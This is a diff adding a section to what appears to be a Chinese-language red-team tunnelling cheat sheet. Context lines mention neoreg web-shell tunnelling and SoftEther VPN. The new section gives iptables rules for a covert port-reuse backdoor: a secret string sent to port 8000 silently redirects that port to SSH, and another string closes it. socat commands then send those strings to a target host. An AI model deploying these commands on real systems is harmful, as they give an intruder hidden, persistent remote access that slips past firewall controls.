@@ -677,6 +677,30 @@ python3 neoreg.py -k password -u http://xx/tunnel.php
 ## SoftEther VPN内网穿透
 [SoftEther VPN内网穿透](https://mp.weixin.qq.com/s/Xim1SKnU41Z_rb9aI0QdDA)
 
+## 端口复用
+
+iptable
+```sh
+# 新建端口复用链
+iptables -t nat -N LETMEIN
+# 端口复用规则
+iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22
+# 开启端口复用开关
+iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT
+# 关闭端口复用开关
+iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
+# 开启端口复用
+iptables -t nat -A PREROUTING -p tcp --dport 8000 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
+```
+
+(2) 使用socat连接
+使用socat发送约定口令至目标主机打开端口复用开关
+
+echo threathuntercoming | socat ‐ tcp:192.168.245.135:8000
+使用完毕后，发送约定关闭口令至目标主机目标端口关闭端口复用
+
+echo threathunterleaving | socat ‐ tcp:192.168.245.135:8000
+
 ## 其他隧道
 
 ICMP隧道
